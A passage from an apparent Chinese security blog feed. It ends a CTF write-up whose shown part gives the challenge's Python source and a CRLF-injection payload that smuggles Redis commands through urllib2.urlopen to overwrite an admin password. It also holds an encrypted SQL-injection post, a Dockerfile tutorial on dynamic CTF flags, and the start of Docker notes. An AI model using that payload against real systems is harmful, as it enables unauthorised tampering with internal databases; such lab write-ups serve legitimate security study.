class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python </span><br><span class="line"># coding:utf8</span><br><span class="line">import cherrypy</span><br><span class="line">import urllib2</span><br><span class="line">import redis</span><br><span class="line"></span><br><span class="line">class web7:</span><br><span class="line"></span><br><span class="line">    def index(self):</span><br><span class="line">        return &quot;&lt;script&gt; window.location.href&#x3D;&#39;&#x2F;input&#39;;&lt;&#x2F;script&gt;&quot;</span><br><span class="line"></span><br><span class="line">    def input(self,url&#x3D;&quot;&quot;,submit&#x3D;&quot;&quot;):</span><br><span class="line">        file&#x3D;open(&quot;index.html&quot;,&quot;r&quot;).read()</span><br><span class="line">        reheaders&#x3D;&quot;&quot;</span><br><span class="line">        if cherrypy.request.method&#x3D;&#x3D;&quot;GET&quot;:</span><br><span class="line">            reheaders&#x3D;&quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">            url&#x3D;cherrypy.request.params[&quot;url&quot;]</span><br><span class="line">            submit&#x3D;cherrypy.request.params[&quot;submit&quot;]</span><br><span class="line">            try:</span><br><span class="line">                for x in urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders&#x3D;reheaders+x+&quot;&lt;br&gt;&quot;</span><br><span class="line">            except Exception,e:</span><br><span class="line">                reheaders&#x3D;&quot;错误&quot;+str(e)</span><br><span class="line">            for x in urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders&#x3D;reheaders+x+&quot;&lt;br&gt;&quot;</span><br><span class="line">        file&#x3D;file.replace(&quot;&lt;?response?&gt;&quot;,reheaders)</span><br><span class="line">        return file</span><br><span class="line"></span><br><span class="line">    def login(self,password&#x3D;&quot;&quot;,submit&#x3D;&quot;&quot;):</span><br><span class="line">        pool &#x3D; redis.ConnectionPool(host&#x3D;&#39;127.0.0.1&#39;, port&#x3D;6379)</span><br><span class="line">        r &#x3D; redis.Redis(connection_pool&#x3D;pool)</span><br><span class="line">        re&#x3D;&quot;&quot;</span><br><span class="line">        file&#x3D;open(&quot;login.html&quot;,&quot;r&quot;).read()</span><br><span class="line">        if cherrypy.request.method&#x3D;&#x3D;&quot;GET&quot;:</span><br><span class="line">            re&#x3D;&quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">            password&#x3D;cherrypy.request.params[&quot;password&quot;]</span><br><span class="line">            submit&#x3D;cherrypy.request.params[&quot;submit&quot;]</span><br><span class="line">            if r.get(&quot;admin&quot;)&#x3D;&#x3D;password:</span><br><span class="line">                re&#x3D;open(&quot;flag&quot;,&#39;r&#39;).readline()</span><br><span class="line">            else:</span><br><span class="line">                re&#x3D;&quot;Can&#39;t find admin:&quot;+password+&quot;,fast fast fast.....&quot;</span><br><span class="line">        file&#x3D;file.replace(&quot;&lt;?response?&gt;&quot;,re)</span><br><span class="line">        return file</span><br><span class="line">cherrypy.config.update(&#123;&#39;server.socket_host&#39;: &#39;0.0.0.0&#39;,</span><br><span class="line">                        &#39;server.socket_port&#39;: 8080,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),&#39;&#x2F;&#39;)</span><br></pre></td></tr></table></figure><p>题目环境：Python 2.7.5+Redis 2.6</p><p>两个输入点，一个<code>/input</code>允许我们输入URL，然后会用urllib2.urlopen()访问我们的URL。还有一个<code>/login</code>，要求我们输入管理员的密码，如果与Redis数据库中的密码相同，我们就可以拿到Flag。</p><p>根据urllib2.urlopen()的历史漏洞：<a href="https://bugs.python.org/issue30458来打内网" target="_blank" rel="noopener">https://bugs.python.org/issue30458来打内网</a></p><p>简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容</p><p>payload：<code>[http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo](http://127.0.0.1 set admin admin save :6379/foo)</code></p><p>提交之后迅速登入login得到flag</p><blockquote><p>参考资料：<a href="https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-GYCTF2020-Easyphp&quot;&gt;&lt;a href=&quot;#0x-01-GYCTF2020-Easyphp&quot; class=&quot;headerlink&quot; title=&quot;0x 01 [GYCTF2020]Easyphp&quot;&gt;&lt;/a&gt;0x 01 [GYCTF2020
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="BUUOJ" scheme="http://yoursite.com/tags/BUUOJ/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入一些tips记录</title>
    <link href="http://yoursite.com/2020/03/23/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9Btips%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/03/23/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9Btips%E8%AE%B0%E5%BD%95/</id>
    <published>2020-03-23T05:54:12.000Z</published>
    <updated>2020-03-24T12:16:44.481Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="28aaf004cbc44fa34ce39f84200bad2262815ab53452cfebf466febb055ce73b">46b23596492c64531b09cace650cd9a917cc4147342c83ec5831cfb7deff4cc92eca58b13aa289292c1dfb41695096d20d990631909710c5c85bc60c1dd25280455736a76aac636944250effad1a500bd88802eaa4f74681db1de5d15d867b81f24f7a2875e5f2b4c0df228feba81426acb050c49c4a2840e96a7fb58d8f6da7d40250c20b1eaaaed6eaec434c4ebd717c2f7ce71a5a158172d0c8cf878e20dee064f516df21c135e50827534a73e5642445d31524f524d1df54c1aea424a812735b8982d06f4ee7038aa51749c94aed0103673a8b838419ba1ddd35bbbbe7ea9ef42514621eb5f96ec5ad002eff7e4b2608dcc4222e936bb52e6f0f33280162f09875d907ebe233110dfa29ef0af3790528086efd0affa78b8084c3ce112d76e4f4dbac75a0420babcbe6d7978c91ea62107c08d8af6e223372b3ff5fb88c498debab66283c627cdbf6bd0fa950d0eb542074d2775ac30767e8d3a64f4540a21c329f926ba77bc94f6d8f8b0c575d57e1d963f67e2c011a6edd9ee79c2be14c9b834e55549b06e1378b45427c20967ff1572f1d6498d147c53ab735765bc561a4e58d139302675d8e23b8688764e270ab2a4dde24bd46c2e6b7fd96bf268f51220e39bb5ca9564bbfb66e809961e962f406d017298a1b48373300b3dafec9ac011b00036fa270562eb85aa9f6ebc26f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>dockerfile编写学习</title>
    <link href="http://yoursite.com/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-03-22T08:25:07.000Z</published>
    <updated>2020-03-22T14:47:34.344Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​        镜像的定制实际上就是定制每一层所添加的配置文件，如果我们可以把每一层的修改、安装、构建、操作的命令都写入一个脚本，然后用这个脚本来构建、定制镜像，那么镜像构建透明性的问题、体积的问题就会得到解决，这个脚本就是 Dockerfile; Dockerfile  是一个文本文件，其内包含了一条条的指令，每一条指令构建一层，每一层指令的内容，就是描述该层应该如何构建，然后通过 commit 构成新的镜像。</p><h3 id="0x-02-Dockerfile-常用参数"><a href="#0x-02-Dockerfile-常用参数" class="headerlink" title="0x 02 Dockerfile 常用参数"></a>0x 02 Dockerfile 常用参数</h3><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>FROM：指定基础镜像，必须是第一条指令,格式为<code>FROM image</code>或<code>FROM image:tag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 定制 nginx 镜像的 Dockerfile</span><br><span class="line"></span><br><span class="line">FROM nginx</span><br><span class="line">RUN echo &#39;&lt;h1&gt;Hello,Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</span><br></pre></td></tr></table></figure><p>注： Docker Hub 上有很多高质量的服务类的官方镜像可以拿来直接使用，比如：nginx 、redis 、mysql 、php 、mongo \ tomcat 等，可以在其中找最符合的一个进行定制</p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>RUN ：用来执行命令行命令，格式有两种：</p><ol><li><p>shell 格式： <code>RUN &lt;命令&gt;</code>，就像直接在命令行中输入的命令一样</p></li><li><p>exec 格式：<code>RUN [&quot;可执行文件&quot;，“参数1”，“参数2”]</code>，更像是函数调用中的格式</p></li></ol><p>warning:每一个RUN命令都会在 docker镜像中新建一层，所以应该尽量少用 RUN 命令，而且要在RUN 的最后要做必要的清除工作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 一层构建，并在最后清理压缩包等缓存文件</span><br><span class="line">FROM debian:stretch</span><br><span class="line"></span><br><span class="line">RUN buildDeps&#x3D;&#39;gcc libc6-dev make wget&#39; \</span><br><span class="line">&amp;&amp; apt-get update \</span><br><span class="line">&amp;&amp; apt-get install -y $buildDeps \</span><br><span class="line">&amp;&amp; wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot; \</span><br><span class="line">&amp;&amp; mkdir -p &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1 \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis install \</span><br><span class="line">&amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;* \</span><br><span class="line">&amp;&amp; rm redis.tar.gz \</span><br><span class="line">&amp;&amp; rm -r &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; apt-get purge -y --auto-remove $buildDeps</span><br></pre></td></tr></table></figure><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p> COPY : 用来从构建上下文目录中&lt;原路径&gt;的文件/目录复制到新一层镜像内的 &lt;目标路径&gt;位置，格式有两种：</p><p>  1，shell 格式：<code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;原路径&gt;...&lt;目标路径&gt;</code></p><p>  2，exec 合适：<code>COPY[--chown=&lt;user&gt;:&lt;group&gt;] [&quot;原路径1&quot;，... &quot;&lt;目标路径&gt;&quot;]</code></p><p>原路径：可以是多个，甚至可以是通配符</p><p>目标路径：可以是容器内的绝对路径，也可以是相对于工作目录的相对路径(工作目录可以用 WORKDIR 指令来指定，不需要事先创建，会自动创建)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 利用 通配符 进行复制</span><br><span class="line">COPY hom* &#x2F;mydir&#x2F;</span><br><span class="line">COPY hom?.txt &#x2F;mydir&#x2F;</span><br></pre></td></tr></table></figure><p>note : COPY 会将原文件的各种数据都保留，比如 读、写、执行权限，可以通过 –chown=<user>:<group> 选项来改变文件的所属用户及所属组。</group></user></p><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;], 推荐使用该方式</span><br><span class="line"></span><br><span class="line">CMD [&quot;param1&quot;, &quot;param2&quot;]，为ENTRYPOINT指令提供预设参数</span><br><span class="line"></span><br><span class="line">CMD command param1 param2 在SHELL中执行</span><br></pre></td></tr></table></figure><p>CMD指令的主要目的是为执行容器提供默认值，每个Dockerfile只有一个CMD命令，如果指定了多个CMD命令，也只会有一条执行，如果启动容器的时候指定了运行的命令，则会覆盖掉CMD指定的命令。</p><h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><p>语法：<code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code></p><p>　　该条指令是声明运行时容器提供的服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。这样声明带来两个好处：</p><p>　　1，帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射</p><p>　　2，在运行时使用随机端口映射，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口</p><p>note: 要将 EXPOSE 和在运行时使用 -p  &lt;宿主端口&gt;:&lt;容器端口&gt; 区分开来。-p 是映射宿主端口和容器端口，就是将容器的对应端口服务公开给外界访问，而  EXPOSE 仅仅是声明容器打算使用什么端口而已，并不会在宿主进行端口映射。</p><h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>格式为：<code>WORKDIR /path/to/workdir</code></p><p>切换⽬录指令，类似于cd命令，对RUN、CMD、ENTRYPOINT⽣效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WORKDIR &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>使用<a href="https://docs.docker.com/engine/reference/builder/#label" target="_blank" rel="noopener">LABEL</a>指令，可以为镜像设置元数据，例如<strong>镜像创建者</strong>或者<strong>镜像说明</strong>。旧版的 Dockerfile 语法使用<a href="https://docs.docker.com/engine/reference/builder/#maintainer-deprecated" target="_blank" rel="noopener">MAINTAINER</a>指令指定镜像创建者，但是它已经被弃用了。有时，一些外部程序需要用到镜像的元数据，例如<a href="https://github.com/NVIDIA/nvidia-docker" target="_blank" rel="noopener">nvidia-docker</a>需要用到<code>com.nvidia.volumes.needed</code>。示例如下:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">7</span>-alpine</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer <span class="string">"jakub.skalecki@example.com"</span></span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Author=<span class="string">"hwlanxiaojun"</span> Blog=<span class="string">"https://hwlanxiaojun.github.io"</span></span></span><br></pre></td></tr></table></figure><h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>ENV : 用来设置环境变量，格式有两种：</p><p>　　1，ENV <key> <value></value></key></p><p>　　2，ENV <key1>=<value1> <key2>=<value2>…</value2></key2></value1></key1></p><p>在设置了环境变量之后，无论是后面的其它指令，如 RUN ，还是运行时的应用，都可以直接使用这里定义的环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 定义环境变量</span><br><span class="line">ENV VERSION&#x3D;1.0 DEBUG&#x3D;ON \</span><br><span class="line">    NAME&#x3D;&quot;Happy Feet&quot;</span><br><span class="line"></span><br><span class="line"># 官方 node 镜像 Dockerfile 中：</span><br><span class="line">ENV NODE_VERSION 7.2.0</span><br></pre></td></tr></table></figure><h3 id="0x-03-构建镜像"><a href="#0x-03-构建镜像" class="headerlink" title="0x 03 构建镜像"></a>0x 03 构建镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t webprac .</span><br><span class="line">&#x2F;&#x2F;其中.表示当前路径，构建的时候要保证jar包和Dockerfile文件在同一个文件夹下，-t: 镜像的名字及标签，webprac是标签名</span><br><span class="line">ocker run -dit -p 8080:80 webprac</span><br></pre></td></tr></table></figure><h4 id="0x-04-动态flag编写"><a href="#0x-04-动态flag编写" class="headerlink" title="0x 04 动态flag编写"></a>0x 04 动态flag编写</h4><p>动态flag的存在形式一般有以下三种：文件中、执行readflag、数据库中</p><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><p>linux下，<code>sed</code>命令可以将file中每行的字符串进行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;原字符串&#x2F;新字符串&#x2F;&#39; file</span><br></pre></td></tr></table></figure><p><code>export</code>命令可以查看、设置环境变量</p><p>那么在<code>docker-php-entrypoint</code>文件中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">sed -i &quot;s&#x2F;flag_here&#x2F;$FLAG&#x2F;&quot; flag.php</span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>就会根据当前环境变量的<code>FLAG</code>值来替换掉<code>flag.php</code>中的<code>flag_here</code>，因此还需要在<code>flag.php</code>中设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; flag_here</span><br></pre></td></tr></table></figure><p>这样，在Dockerfile目录执行<code>docker build -t test .</code>将Dockerfile文件打包为镜像<code>test</code>，使用安装了动态靶机插件的CTFd平台部署后，该插件在启动靶机时会自动生成flag并应用到环境变量中，这样便实现了生成动态flag。</p><h4 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h4><p>先来看下写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line"></span><br><span class="line">echo $FLAG &gt; &#x2F;flag</span><br><span class="line">chmod u+s &#x2F;readflag</span><br><span class="line">chmod 400 &#x2F;flag</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>首先将环境变量<code>$FLAG</code>写入到<code>/flag</code>中，之后进行权限配置：</p><p>1.chmod u+s /readflag ： 为<code>/readflag</code>文件加上setuid标志，设置使文件在执行阶段具有文件所有者的权限</p><p>2.chmod 400 /flag ：将<code>flag</code>文件权限设为文件拥有者只读，群组和其他用户没有任何权限</p><p>那么执行<code>./readflag</code>时，就会拥有文件所有者的权限，可以读取<code>/flag</code>了</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>flag.sh：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># 修改数据库中的 FLAG</span><br><span class="line">mysql -e &quot;CREATE DATABASE IF NOT EXISTS supersqli;USE supersqli; CREATE TABLE IF NOT EXISTS \&#96;1919810931114514\&#96; (\&#96;flag\&#96; varchar(100) NOT NULL) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8;INSERT INTO \&#96;1919810931114514\&#96; VALUES (&#39;$FLAG&#39;);&quot; -uroot -proot</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br><span class="line"></span><br><span class="line">rm -f &#x2F;flag.sh</span><br></pre></td></tr></table></figure><h3 id="0x-05-打包镜像到Docker-Hub"><a href="#0x-05-打包镜像到Docker-Hub" class="headerlink" title="0x 05 打包镜像到Docker Hub"></a>0x 05 打包镜像到Docker Hub</h3><p>为了方便搜索和下载自己编写的镜像，可以通过以下步骤来实现：</p><p>1.到<code>https://hub.docker.com/</code>注册一个账号</p><p>2.登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login -u 用户名 -p 密码</span><br></pre></td></tr></table></figure><p>3.更改镜像标签，格式为<code>用户名/标签名</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag test 用户名&#x2F;镜像名</span><br></pre></td></tr></table></figure><p>4.推送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push 用户名&#x2F;镜像名</span><br></pre></td></tr></table></figure><p>5.登出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logout</span><br></pre></td></tr></table></figure><p>这时就可以在Docker Hub上找到刚上传的镜像了，将其添加描述后就能使用<code>docker search</code>搜索到自己的镜像</p><h3 id="0x-06-ctfd平台部署"><a href="#0x-06-ctfd平台部署" class="headerlink" title="0x 06 ctfd平台部署"></a>0x 06 ctfd平台部署</h3><p>参考这几篇文章：</p><p><a href="https://www.zhaoj.in/read-6333.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6333.html</a></p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756" target="_blank" rel="noopener">https://blog.csdn.net/fjh1997/article/details/100850756</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd</a></p><h3 id="0x-07-docker-compose"><a href="#0x-07-docker-compose" class="headerlink" title="0x 07 docker-compose"></a>0x 07 docker-compose</h3><p>docker-compose.yml：告诉docker-compose该怎么编排一组服务</p><p><img src="/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/image-20200322224722173.png" alt></p><p>参考链接：</p><blockquote><p><a href="https://www.cnblogs.com/zpcoding/p/11450686.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpcoding/p/11450686.html</a></p><p><a href="https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html" target="_blank" rel="noopener">https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html</a></p><p><a href="http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-前言&quot;&gt;&lt;a href=&quot;#0x-01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x 01 前言&quot;&gt;&lt;/a&gt;0x 01 前言&lt;/h3&gt;&lt;p&gt;​        镜像的定制实际上就是定制每一层所添加的配置文件，如果我们可以把每一层的修改
      
    
    </summary>
    
    
      <category term="基础知识" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="dockerfile编写" scheme="http://yoursite.com/tags/dockerfile%E7%BC%96%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>docker学习笔记</title>
    <link href="http://yoursite.com/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-22T07:43:39.000Z</published>
    <updated>2020-03-22T08:07:52.562Z</updated>
    
    <content type="html"><![CDATA[<h3 id="docker简介"><a href="#docker简介" class="headerlink" title="docker简介"></a>docker简介</h3><ul><li>Docker是一个新的容器化的技术，容器有效的将单个操作系统管理的资源划分到孤立的组中，以便更好的在孤立的组之间平衡有冲突的资源使用需求。</li><li>Docker 容器本质上是宿主机上的一个进程。Docker 通过 namespace 实现了资源隔离，通过 cgroups 实现了资源的限制，通过写时复制机制（copy-on-write）实现了高效的文件操作。 </li><li>Docker有五个命名空间：进程、网络、挂载、宿主和共享内存，为了隔离有问题的应用，Docker运用Namespace将进程隔离，为进程或进程组创建已隔离的运行空间，为进程提供不同的命名空间视图。这样，每一个隔离出来的进程组，对外就表现为一个container(容器)。</li></ul><h3 id="镜像和容器"><a href="#镜像和容器" class="headerlink" title="镜像和容器"></a>镜像和容器</h3><ul><li><p>Image: 镜像是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p></li><li><p>Container:容器是镜像的运行时实例 - 实际执行时镜像会在内存中变成什么。默认情况下，它完全独立于主机环境运行，仅在配置为访问主机文件和端口的情况下才执行此操作。</p></li><li><p><code>容器 = 镜像 + 读写层</code></p><p>容器可以获取本机访问，每个容器都在独立进程中运行，占用的内存不超过任何其他可执行文件。</p></li></ul><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322154938724.png" alt="image-20200322154938724"></p><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322155027373.png" alt="image-20200322155027373"></p><h3 id="Docker的使用"><a href="#Docker的使用" class="headerlink" title="Docker的使用"></a>Docker的使用</h3><h4 id="启动和放入启动项"><a href="#启动和放入启动项" class="headerlink" title="启动和放入启动项"></a>启动和放入启动项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#centos7.0版本</span><br><span class="line">systemctl start docker </span><br><span class="line">systemctl enable docker</span><br><span class="line"></span><br><span class="line">#兼容老版本</span><br><span class="line">service docker start</span><br><span class="line">chkconfig docker on</span><br></pre></td></tr></table></figure><h4 id="image相关操作"><a href="#image相关操作" class="headerlink" title="image相关操作"></a>image相关操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 